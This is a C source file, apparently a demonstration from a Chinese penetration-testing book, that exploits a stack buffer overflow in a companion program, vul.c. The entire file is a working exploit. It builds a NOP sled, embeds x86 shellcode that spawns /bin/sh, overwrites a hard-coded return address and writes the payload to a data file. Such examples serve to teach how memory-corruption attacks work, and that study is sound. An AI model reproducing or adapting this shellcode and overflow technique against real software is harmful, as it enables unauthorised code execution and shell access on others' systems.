/* exp.c
* 
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  针对vul.c的利用程序
*/

#include <fcntl.h>
#define BUFSIZE 1024
#define RET     0xbfbff504
#define RET_OFF 43

char shellcode[]=
"\xeb\x16\x5e\x31\xc0\x8d\x0e\x89"
"\x4e\x08\x89\x46\x0c\x8d\x4e\x08"
"\x50\x51\x56\x50\xb0\x3b\xcd\x80"
"\xe8\xe5\xff\xff\xff/bin/sh";

int main(void)
{
    char buff[BUFSIZE];
    int fp;

    memset(buff, 0x90, BUFSIZE);
    memcpy(buff+BUFSIZE/2, shellcode, sizeof(shellcode));
    *(int *)&buff[BUFSIZE-RET_OFF] = RET;
    buff[BUFSIZE-RET_OFF+12+1] = 0;
    buff[BUFSIZE-RET_OFF+12+2] = 0;
    buff[BUFSIZE-RET_OFF+12+3] = 0;

    fp = open("exp.data", O_CREAT | O_TRUNC | O_WRONLY, 0644);
    write(fp, buff, BUFSIZE);
    close(fp);

    exit(0);
}
